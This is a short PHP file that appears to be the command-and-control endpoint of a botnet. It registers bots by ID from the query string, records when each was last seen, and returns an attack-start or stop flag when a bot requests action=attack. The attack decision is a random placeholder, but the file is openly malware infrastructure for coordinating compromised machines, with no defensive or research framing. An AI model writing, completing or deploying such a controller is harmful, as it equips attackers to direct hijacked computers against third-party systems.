<?php
// Include necessary functions to handle bot data and server commands
require_once 'functions.php';

// Fetch bot data from the stored file
$all_bot_data = getBotsData();

// Flag to check if a bot is registered or not
$flag = 0;
$bot_id = $_GET['bot_id'] ?? null;
$action = $_GET['action'] ?? null;

if($bot_id) {
    // Check if the bot is registered
    foreach($all_bot_data as $id => $time) {
        if($id == $bot_id) {
            $all_bot_data[$id] = time(); // Update bot's last seen timestamp
            $flag = 1;
        }
    }
    
    // If the bot is not registered, register it
    if($flag == 0) {
        $all_bot_data[$bot_id] = time();
    }
    
    // Save the updated bot data
    saveBotData($all_bot_data);
    
    // Handle the action requested by the bot (attack command)
    if($action == 'attack') {
        // Example of attack logic: Return the attack value (1 for attack)
        echo getAttackValue();
    } else {
        // Return a default response if no specific action is requested
        echo "Bot registered/updated.";
    }
} else {
    echo "No bot_id specified.";
}

// Function to retrieve attack command value (1 to start attack, 0 to stop)
function getAttackValue() {
    // Return 1 for an attack, 0 to stop (can be modified based on more sophisticated logic)
    return rand(0, 1);  // Simulated for demonstration purposes
}
?>
